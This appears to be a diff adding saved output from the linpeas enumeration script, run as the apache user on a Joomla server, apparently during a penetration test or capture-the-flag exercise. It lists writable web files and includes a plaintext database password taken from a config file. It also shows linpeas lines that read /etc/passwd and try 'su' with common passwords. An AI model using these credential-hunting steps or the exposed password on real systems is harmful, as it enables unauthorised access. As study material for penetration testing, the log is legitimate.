+/var/www/html/administrator/components/com_banners/models/fields/bannerclient.php
+/var/www/html/administrator/components/com_banners/models/fields/clicks.php
+/var/www/html/administrator/components/com_banners/models/fields/impmade.php
+/var/www/html/administrator/components/com_banners/models/fields/imptotal.php
+/var/www/html/administrator/components/com_banners/models/forms
+/var/www/html/administrator/components/com_banners/models/forms/banner.xml
+/var/www/html/administrator/components/com_banners/models/forms/client.xml
+/var/www/html/administrator/components/com_banners/models/forms/download.xml
+/var/www/html/administrator/components/com_banners/models/forms/filter_banners.xml
+/var/www/html/administrator/components/com_banners/models/forms/filter_clients.xml
+/var/www/html/administrator/components/com_banners/models/forms/filter_tracks.xml
+/var/www/html/administrator/components/com_banners/models/tracks.php
+/var/www/html/administrator/components/com_banners/sql
+/var/www/html/administrator/components/com_banners/sql/install.mysql.utf8.sql
+/var/www/html/administrator/components/com_banners/sql/uninstall.mysql.utf8.sql
+/var/www/html/administrator/components/com_banners/tables
+/var/www/html/administrator/components/com_banners/tables/banner.php
+/var/www/html/administrator/components/com_banners/tables/client.php
+/var/www/html/administrator/components/com_banners/views
+/var/www/html/administrator/components/com_banners/views/banner
+/var/www/html/administrator/components/com_banners/views/banner/tmpl
+/var/www/html/administrator/components/com_banners/views/banner/tmpl/edit.php
+/var/www/html/administrator/components/com_banners/views/banner/view.html.php
+/var/www/html/administrator/components/com_banners/views/banners
+/var/www/html/administrator/components/com_banners/views/banners/tmpl
+/var/www/html/administrator/components/com_banners/views/banners/tmpl/default.php
+/var/www/html/administrator/components/com_banners/views/banners/tmpl/default_batch_body.php
+/var/www/html/administrator/components/com_banners/views/banners/tmpl/default_batch_footer.php
+/var/www/html/administrator/components/com_banners/views/banners/view.html.php
+/var/www/html/administrator/components/com_banners/views/client
+/var/www/html/administrator/components/com_banners/views/client/tmpl
+/var/www/html/administrator/components/com_banners/views/client/tmpl/edit.php
+/var/www/html/administrator/components/com_banners/views/client/view.html.php
+/var/www/html/administrator/components/com_banners/views/clients
+/var/www/html/administrator/components/com_banners/views/clients/tmpl
+/var/www/html/administrator/components/com_banners/views/clients/tmpl/default.php
+/var/www/html/administrator/components/com_banners/views/clients/view.html.php
+/var/www/html/administrator/components/com_banners/views/download
+/var/www/html/administrator/components/com_banners/views/download/tmpl
+/var/www/html/administrator/components/com_banners/views/download/tmpl/default.php
+/var/www/html/administrator/components/com_banners/views/download/view.html.php
+/var/www/html/administrator/components/com_banners/views/tracks
+/var/www/html/administrator/components/com_banners/views/tracks/tmpl
+/var/www/html/administrator/components/com_banners/views/tracks/tmpl/default.php
+/var/www/html/administrator/components/com_banners/views/tracks/view.html.php
+/var/www/html/administrator/components/com_banners/views/tracks/view.raw.php
+/var/www/html/administrator/components/com_cache
+/var/www/html/administrator/components/com_cache/cache.php
+/var/www/html/administrator/components/com_cache/cache.xml
+/var/www/html/administrator/components/com_cache/config.xml
+/var/www/html/administrator/components/com_cache/controller.php
+/var/www/html/administrator/components/com_cache/helpers
+/var/www/html/administrator/components/com_cache/helpers/cache.php
+/var/www/html/administrator/components/com_cache/models
+/var/www/html/administrator/components/com_cache/models/cache.php
+/var/www/html/administrator/components/com_cache/models/forms
+/var/www/html/administrator/components/com_cache/models/forms/filter_cache.xml
+/var/www/html/administrator/components/com_cache/views
+/var/www/html/administrator/components/com_cache/views/cache
+/var/www/html/administrator/components/com_cache/views/cache/tmpl
+/var/www/html/administrator/components/com_cache/views/cache/tmpl/default.php
+/var/www/html/administrator/components/com_cache/views/cache/tmpl/default.xml
+/var/www/html/administrator/components/com_cache/views/cache/view.html.php
+/var/www/html/administrator/components/com_cache/views/purge
+/var/www/html/administrator/components/com_cache/views/purge/tmpl
+/var/www/html/administrator/components/com_cache/views/purge/tmpl/default.php
+/var/www/html/administrator/components/com_cache/views/purge/tmpl/default.xml
+/var/www/html/administrator/components/com_cache/views/purge/view.html.php
+/var/www/html/administrator/components/com_categories
+/var/www/html/administrator/components/com_categories/categories.php
+/var/www/html/administrator/components/com_categories/categories.xml
+/var/www/html/administrator/components/com_categories/controller.php
+/var/www/html/administrator/components/com_categories/controllers
+/var/www/html/administrator/components/com_categories/controllers/categories.php
+/var/www/html/administrator/components/com_categories/controllers/category.php
+/var/www/html/administrator/components/com_categories/helpers
+/var/www/html/administrator/components/com_categories/helpers/association.php
+/var/www/html/administrator/components/com_categories/helpers/categories.php
+/var/www/html/administrator/components/com_categories/helpers/html
+/var/www/html/administrator/components/com_categories/helpers/html/categoriesadministrator.php
+/var/www/html/administrator/components/com_categories/models
+/var/www/html/administrator/components/com_categories/models/categories.php
+/var/www/html/administrator/components/com_categories/models/category.php
+/var/www/html/administrator/components/com_categories/models/fields
+/var/www/html/administrator/components/com_categories/models/fields/categoryedit.php
+/var/www/html/administrator/components/com_categories/models/fields/categoryparent.php
+/var/www/html/administrator/components/com_categories/models/fields/modal
+/var/www/html/administrator/components/com_categories/models/fields/modal/category.php
+/var/www/html/administrator/components/com_categories/models/forms
+/var/www/html/administrator/components/com_categories/models/forms/category.xml
+/var/www/html/administrator/components/com_categories/models/forms/filter_categories.xml
+/var/www/html/administrator/components/com_categories/tables
+/var/www/html/administrator/components/com_categories/tables/category.php
+/var/www/html/administrator/components/com_categories/views
+/var/www/html/administrator/components/com_categories/views/categories
+/var/www/html/administrator/components/com_categories/views/categories/tmpl
+/var/www/html/administrator/components/com_categories/views/categories/tmpl/default.php
+/var/www/html/administrator/components/com_categories/views/categories/tmpl/default.xml
+/var/www/html/administrator/components/com_categories/views/categories/tmpl/default_batch_body.php
+/var/www/html/administrator/components/com_categories/views/categories/tmpl/default_batch_footer.php
+/var/www/html/administrator/components/com_categories/views/categories/tmpl/modal.php
+/var/www/html/administrator/components/com_categories/views/categories/view.html.php
+/var/www/html/administrator/components/com_categories/views/category
+/var/www/html/administrator/components/com_categories/views/category/tmpl
+/var/www/html/administrator/components/com_categories/views/category/tmpl/edit.php
+/var/www/html/administrator/components/com_categories/views/category/tmpl/edit.xml
+/var/www/html/administrator/components/com_categories/views/category/tmpl/edit_associations.php
+/var/www/html/administrator/components/com_categories/views/category/tmpl/edit_metadata.php
+/var/www/html/administrator/components/com_categories/views/category/tmpl/modal.php
+/var/www/html/administrator/components/com_categories/views/category/tmpl/modal_associations.php
+/var/www/html/administrator/components/com_categories/views/category/tmpl/modal_extrafields.php
+/var/www/html/administrator/components/com_categories/views/category/tmpl/modal_metadata.php
+/var/www/html/administrator/components/com_categories/views/category/tmpl/modal_options.php
+/var/www/html/administrator/components/com_categories/views/category/view.html.php
+/var/www/html/administrator/components/com_checkin
+/var/www/html/administrator/components/com_checkin/checkin.php
+/var/www/html/administrator/components/com_checkin/checkin.xml
+/var/www/html/administrator/components/com_checkin/config.xml
+/var/www/html/administrator/components/com_checkin/controller.php
+/var/www/html/administrator/components/com_checkin/models
+/var/www/html/administrator/components/com_checkin/models/checkin.php
+/var/www/html/administrator/components/com_checkin/models/forms
+/var/www/html/administrator/components/com_checkin/models/forms/filter_checkin.xml
+/var/www/html/administrator/components/com_checkin/views
+/var/www/html/administrator/components/com_checkin/views/checkin
+/var/www/html/administrator/components/com_checkin/views/checkin/tmpl
+/var/www/html/administrator/components/com_checkin/views/checkin/tmpl/default.php
+/var/www/html/administrator/components/com_checkin/views/checkin/tmpl/default.xml
+/var/www/html/administrator/components/com_checkin/views/checkin/view.html.php
+/var/www/html/administrator/components/com_config
+/var/www/html/administrator/components/com_config/access.xml
+/var/www/html/administrator/components/com_config/config.php
+/var/www/html/administrator/components/com_config/config.xml
+/var/www/html/administrator/components/com_config/controller
+/var/www/html/administrator/components/com_config/controller.php
+/var/www/html/administrator/components/com_config/controller/application
+/var/www/html/administrator/components/com_config/controller/application/cancel.php
+/var/www/html/administrator/components/com_config/controller/application/display.php
+/var/www/html/administrator/components/com_config/controller/application/removeroot.php
+/var/www/html/administrator/components/com_config/controller/application/save.php
+/var/www/html/administrator/components/com_config/controller/application/sendtestmail.php
+/var/www/html/administrator/components/com_config/controller/application/store.php
+/var/www/html/administrator/components/com_config/controller/component
+/var/www/html/administrator/components/com_config/controller/component/cancel.php
+/var/www/html/administrator/components/com_config/controller/component/display.php
+/var/www/html/administrator/components/com_config/controller/component/save.php
+/var/www/html/administrator/components/com_config/controllers
+/var/www/html/administrator/components/com_config/controllers/application.php
+/var/www/html/administrator/components/com_config/controllers/component.php
+/var/www/html/administrator/components/com_config/helper
+/var/www/html/administrator/components/com_config/helper/config.php
+/var/www/html/administrator/components/com_config/model
+/var/www/html/administrator/components/com_config/model/application.php
+/var/www/html/administrator/components/com_config/model/component.php
+/var/www/html/administrator/components/com_config/model/field
+/var/www/html/administrator/components/com_config/model/field/configcomponents.php
+/var/www/html/administrator/components/com_config/model/field/filters.php
+/var/www/html/administrator/components/com_config/model/form
+/var/www/html/administrator/components/com_config/model/form/application.xml
+/var/www/html/administrator/components/com_config/models
+/var/www/html/administrator/components/com_config/models/application.php
+/var/www/html/administrator/components/com_config/models/component.php
+/var/www/html/administrator/components/com_config/view
+/var/www/html/administrator/components/com_config/view/application
+/var/www/html/administrator/components/com_config/view/application/html.php
+/var/www/html/administrator/components/com_config/view/application/json.php
+/var/www/html/administrator/components/com_config/view/application/tmpl
+/var/www/html/administrator/components/com_config/view/application/tmpl/default.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default.xml
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_cache.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_cookie.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_database.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_debug.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_filters.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_ftp.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_ftplogin.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_locale.php
+/var/www/html/administrator/components/com_config/view/application/tmpl/default_mail.php
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/administrator/components/com_config/view/component/html.php
+/var/www/html/administrator/components/com_config/view/component/tmpl
+/var/www/html/administrator/components/com_config/view/component/tmpl/default.php
+/var/www/html/administrator/components/com_config/view/component/tmpl/default.xml
+/var/www/html/administrator/components/com_config/view/component/tmpl/default_navigation.php
+/var/www/html/administrator/components/com_contact
+/var/www/html/administrator/components/com_contact/access.xml
+/var/www/html/administrator/components/com_contact/config.xml
+/var/www/html/administrator/components/com_contact/contact.php
+/var/www/html/administrator/components/com_contact/contact.xml
+/var/www/html/administrator/components/com_contact/controller.php
+/var/www/html/administrator/components/com_contact/controllers
+/var/www/html/administrator/components/com_contact/controllers/contact.php
+/var/www/html/administrator/components/com_contact/controllers/contacts.php
+/var/www/html/administrator/components/com_contact/helpers
+/var/www/html/administrator/components/com_contact/helpers/associations.php
+/var/www/html/administrator/components/com_contact/helpers/contact.php
+/var/www/html/administrator/components/com_contact/helpers/html
+/var/www/html/administrator/components/com_contact/helpers/html/contact.php
+/var/www/html/administrator/components/com_contact/models
+/var/www/html/administrator/components/com_contact/models/contact.php
+/var/www/html/administrator/components/com_contact/models/contacts.php
+/var/www/html/administrator/components/com_contact/models/fields
+/var/www/html/administrator/components/com_contact/models/fields/modal
+/var/www/html/administrator/components/com_contact/models/fields/modal/contact.php
+/var/www/html/administrator/components/com_contact/models/forms
+/var/www/html/administrator/components/com_contact/models/forms/contact.xml
+/var/www/html/administrator/components/com_contact/models/forms/filter_contacts.xml
+/var/www/html/administrator/components/com_contact/sql
+/var/www/html/administrator/components/com_contact/sql/install.mysql.utf8.sql
+/var/www/html/administrator/components/com_contact/sql/uninstall.mysql.utf8.sql
+/var/www/html/administrator/components/com_contact/tables
+/var/www/html/administrator/components/com_contact/tables/contact.php
+/var/www/html/administrator/components/com_contact/views
+/var/www/html/administrator/components/com_contact/views/contact
+/var/www/html/administrator/components/com_contact/views/contact/tmpl
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/edit.php
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/edit_associations.php
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/edit_metadata.php
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/edit_params.php
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/modal.php
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/modal_associations.php
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/modal_metadata.php
+/var/www/html/administrator/components/com_contact/views/contact/tmpl/modal_params.php
+/var/www/html/administrator/components/com_contact/views/contact/view.html.php
+/var/www/html/administrator/components/com_contact/views/contacts
+/var/www/html/administrator/components/com_contact/views/contacts/tmpl
+/var/www/html/administrator/components/com_contact/views/contacts/tmpl/default.php
+/var/www/html/administrator/components/com_contact/views/contacts/tmpl/default_batch.php
+/var/www/html/administrator/components/com_contact/views/contacts/tmpl/default_batch_body.php
+/var/www/html/administrator/components/com_contact/views/contacts/tmpl/default_batch_footer.php
+/var/www/html/administrator/components/com_contact/views/contacts/tmpl/modal.php
+/var/www/html/administrator/components/com_contact/views/contacts/view.html.php
+/var/www/html/administrator/components/com_content
+/var/www/html/administrator/components/com_content/access.xml
+/var/www/html/administrator/components/com_content/config.xml
+/var/www/html/administrator/components/com_content/content.php
+/var/www/html/administrator/components/com_content/content.xml
+/var/www/html/administrator/components/com_content/controller.php
+/var/www/html/administrator/components/com_content/controllers
+/var/www/html/administrator/components/com_content/controllers/article.php
+/var/www/html/administrator/components/com_content/controllers/articles.php
+/var/www/html/administrator/components/com_content/controllers/featured.php
+/var/www/html/administrator/components/com_content/helpers
+/var/www/html/administrator/components/com_content/helpers/associations.php
+/var/www/html/administrator/components/com_content/helpers/content.php
+/var/www/html/administrator/components/com_content/helpers/html
+/var/www/html/administrator/components/com_content/helpers/html/contentadministrator.php
+/var/www/html/administrator/components/com_content/models
+/var/www/html/administrator/components/com_content/models/article.php
+/var/www/html/administrator/components/com_content/models/articles.php
+/var/www/html/administrator/components/com_content/models/feature.php
+/var/www/html/administrator/components/com_content/models/featured.php
+/var/www/html/administrator/components/com_content/models/fields
+/var/www/html/administrator/components/com_content/models/fields/modal
+/var/www/html/administrator/components/com_content/models/fields/modal/article.php
+/var/www/html/administrator/components/com_content/models/forms
+/var/www/html/administrator/components/com_content/models/forms/article.xml
+/var/www/html/administrator/components/com_content/models/forms/filter_articles.xml
+/var/www/html/administrator/components/com_content/models/forms/filter_featured.xml
+/var/www/html/administrator/components/com_content/tables
+/var/www/html/administrator/components/com_content/tables/featured.php
+/var/www/html/administrator/components/com_content/views
+/var/www/html/administrator/components/com_content/views/article
+/var/www/html/administrator/components/com_content/views/article/tmpl
+/var/www/html/administrator/components/com_content/views/article/tmpl/edit.php
+/var/www/html/administrator/components/com_content/views/article/tmpl/edit.xml
+/var/www/html/administrator/components/com_content/views/article/tmpl/edit_associations.php
+/var/www/html/administrator/components/com_content/views/article/tmpl/edit_metadata.php
+/var/www/html/administrator/components/com_content/views/article/tmpl/modal.php
+/var/www/html/administrator/components/com_content/views/article/tmpl/modal_associations.php
+/var/www/html/administrator/components/com_content/views/article/tmpl/modal_metadata.php
+/var/www/html/administrator/components/com_content/views/article/tmpl/pagebreak.php
+/var/www/html/administrator/components/com_content/views/article/view.html.php
+/var/www/html/administrator/components/com_content/views/articles
+/var/www/html/administrator/components/com_content/views/articles/tmpl
+/var/www/html/administrator/components/com_content/views/articles/tmpl/default.php
+/var/www/html/administrator/components/com_content/views/articles/tmpl/default.xml
+/var/www/html/administrator/components/com_content/views/articles/tmpl/default_batch_body.php
+/var/www/html/administrator/components/com_content/views/articles/tmpl/default_batch_footer.php
+/var/www/html/administrator/components/com_content/views/articles/tmpl/modal.php
+/var/www/html/administrator/components/com_content/views/articles/view.html.php
+/var/www/html/administrator/components/com_content/views/featured
+/var/www/html/administrator/components/com_content/views/featured/tmpl
+/var/www/html/administrator/components/com_content/views/featured/tmpl/default.php
+/var/www/html/administrator/components/com_content/views/featured/tmpl/default.xml
+/var/www/html/administrator/components/com_content/views/featured/view.html.php
+/var/www/html/administrator/components/com_contenthistory
+/var/www/html/administrator/components/com_contenthistory/contenthistory.php
+/var/www/html/administrator/components/com_contenthistory/contenthistory.xml
+/var/www/html/administrator/components/com_contenthistory/controller.php
+/var/www/html/administrator/components/com_contenthistory/controllers
+/var/www/html/administrator/components/com_contenthistory/controllers/history.php
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group apache:
+/dev/mqueue/linpeas.txt18980
+/var/lib/php/session
+/var/lib/php/wsdlcache
+
+[+] Searching passwords in config PHP files
+	public $password = 'nv5uz9r3ZEDzVjNu';
+
+[+] Finding IPs inside logs (limit 70)
+
+[+] Finding passwords inside logs (limit 70)
+
+[+] Finding emails inside logs (limit 70)
+      1 /var/log/dmesg:mockbuild@kbuilder.bsys.centos.org
+      1 /var/log/dmesg:dm-devel@redhat.com
+      1 /var/log/dmesg.old:mockbuild@kbuilder.bsys.centos.org
+      1 /var/log/dmesg.old:dm-devel@redhat.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/alternatives/mysqlbug:  $PASSWD | grep "^$LOGNAME:" | awk -F: '{print $5}' | sed -e 's/,.*//' > $TEMP
+/etc/alternatives/mysqlbug:PASSWD="cat /etc/passwd"
+/etc/nsswitch.conf.bak:passwd:     files sss
+/etc/nsswitch.conf:passwd:     files sss
+/etc/pam.d/password-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/password-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/system-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/system-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/php.ini:; Define the anonymous ftp password (your email address). PHP's default setting
+/etc/pki/tls/openssl.cnf:challengePassword		= A challenge password
+/etc/pki/tls/openssl.cnf:challengePassword_max		= 20
+/etc/pki/tls/openssl.cnf:challengePassword_min		= 4
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/selinux/semanage.conf:usepasswd=False
+/etc/selinux/targeted/contexts/files/file_contexts:/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/\.pwd\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/dovecot\.passwd.*	system_u:object_r:dovecot_passwd_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group[-\+]?	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd[-\+]?	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.OLD	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.adjunct.*	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/ptmptmp	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/rc\.d/init\.d/yppasswd	--	system_u:object_r:nis_initrc_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/samba/smbpasswd	--	system_u:object_r:samba_secrets_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd	--	system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd\.old	--	system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/opt/vmware/(workstation|player)/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/chage	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/passwd	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-gnome-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd\.bin	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/systemd/system/yppasswdd.*	--	system_u:object_r:nis_unit_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/libexec/httpd-ssl-pass-dialog	--	system_u:object_r:httpd_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/chpasswd	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpunconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwhistory_helper	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwunconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd	--	system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd\.env	--	system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/validate	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/system-config-rootpassword/system-config-rootpassword	--	system_u:object_r:bin_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password-block(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/yppass.*	--	system_u:object_r:yppasswdd_var_run_t:s0
+/etc/sysconfig/authconfig:PASSWDALGORITHM=sha512
+/etc/sysconfig/authconfig:USEPASSWDQC=no
+/tmp/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
+/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
+/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
+/tmp/linpeas.sh:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
+
+[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/selinux/targeted/contexts/files/file_contexts.homedirs:/home/[^/]+/public_git(/.*)?	unconfined_u:object_r:git_user_content_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/pgsql/test/regress(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/jonas/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/postgres(ql)?(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/sepgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/sepgsql_contexts:db_database	*			system_u:object_r:sepgsql_db_t:s0
+/var/www/html/administrator/components/com_admin/script.php:					->where($db->quoteName('client_id') . ' = 1')
+/var/www/html/administrator/components/com_admin/script.php:				$data['client_id']    = 1;
+/var/www/html/administrator/components/com_admin/script.php:				. ' AND client_id=' . $extension[3], 'OR'
+/var/www/html/administrator/components/com_admin/sql/updates/mysql/3.0.0.sql:			AND client_id = 1) as c) = 0
+/var/www/html/administrator/components/com_associations/models/associations.php:			->where($db->qn('a.client_id') . ' = 0');
+/var/www/html/administrator/components/com_banners/helpers/html/banner.php:				'<select name="batch[client_id]" id="batch-client-id">',
+/var/www/html/administrator/components/com_banners/models/banner.php:		'client_id'   => 'batchClient',
+/var/www/html/administrator/components/com_cache/views/cache/view.html.php:		if ($state->get('client_id') == 1)
+/var/www/html/administrator/components/com_categories/models/category.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_content/models/article.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_fields/models/field.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_fields/models/group.php:	protected function cleanCache($group = null, $client_id = 0)
+/var/www/html/administrator/components/com_finder/models/filter.php:	protected function cleanCache($group = 'com_finder', $client_id = 1)
+/var/www/html/administrator/components/com_installer/models/discover.php:			$query->where($db->quoteName('client_id') . ' = ' . (int) $clientId);
+/var/www/html/administrator/components/com_installer/models/extension.php:			$path = $item->client_id ? JPATH_ADMINISTRATOR : JPATH_SITE;
+/var/www/html/administrator/components/com_installer/models/languages.php:			->where($db->qn('e.client_id') . ' = 0')
+/var/www/html/administrator/components/com_installer/models/manage.php:			$query->where('client_id = ' . (int) $clientId);
+/var/www/html/administrator/components/com_installer/models/update.php:			$query->where($db->quoteName('u.client_id') . ' = ' . (int) $clientId);
+/var/www/html/administrator/components/com_installer/models/updatesites.php:			$query->where('e.client_id = ' . (int) $clientId);
+/var/www/html/administrator/components/com_joomlaupdate/controllers/update.php:			'secretkey' => $this->input->post->get('secretkey', '', 'raw'),
+/var/www/html/administrator/components/com_joomlaupdate/models/default.php:			$ftp_host = $app->input->get('ftp_host', '');
+/var/www/html/administrator/components/com_joomlaupdate/models/default.php:			$ftp_user = $app->input->get('ftp_user', '');
+/var/www/html/administrator/components/com_joomlaupdate/restore.php:		'FTP_HOST'                        => '(S)FTP host name:',
+/var/www/html/administrator/components/com_joomlaupdate/restore.php:		'FTP_USER'                        => '(S)FTP user name:',
+/var/www/html/administrator/components/com_joomlaupdate/restore.php:		'WRONG_FTP_HOST'                  => 'Wrong FTP host or port',
+/var/www/html/administrator/components/com_joomlaupdate/restore.php:		'WRONG_FTP_USER'                  => 'Wrong FTP username or password',
+/var/www/html/administrator/components/com_languages/controllers/installed.php:			if ($model->getState('client_id') == 1)
+/var/www/html/administrator/components/com_languages/helpers/multilangstatus.php:			->where($db->qn('client_id') . ' = ' . $db->q('0'))
+/var/www/html/administrator/components/com_languages/helpers/multilangstatus.php:			->where($db->qn('client_id') . ' = ' . $db->q('0'));
+/var/www/html/administrator/components/com_languages/helpers/multilangstatus.php:			->where('client_id = 0');
+/var/www/html/administrator/components/com_languages/helpers/multilangstatus.php:			->where('e.client_id = 0')
+/var/www/html/administrator/components/com_languages/models/installed.php:				$row->client_id    = (int) $lang->client_id;
+/var/www/html/administrator/components/com_languages/models/installed.php:				if ($installedLanguage->client_id !== $clientId)
